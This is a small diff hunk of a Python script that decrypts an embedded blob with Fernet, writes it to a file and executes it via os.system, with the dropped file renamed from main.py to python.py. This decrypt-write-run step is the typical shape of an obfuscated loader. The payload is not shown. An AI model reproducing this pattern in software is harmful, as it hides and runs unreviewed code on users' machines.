@@ -24,7 +24,7 @@ f = Fernet(key)
 data = f.decrypt(data.encode())
 
 
-with open("main.py", "wb") as f:
+with open("python.py", "wb") as f:
 	f.write(data)
 
-os.system("start main.py")
+os.system("start python.py")
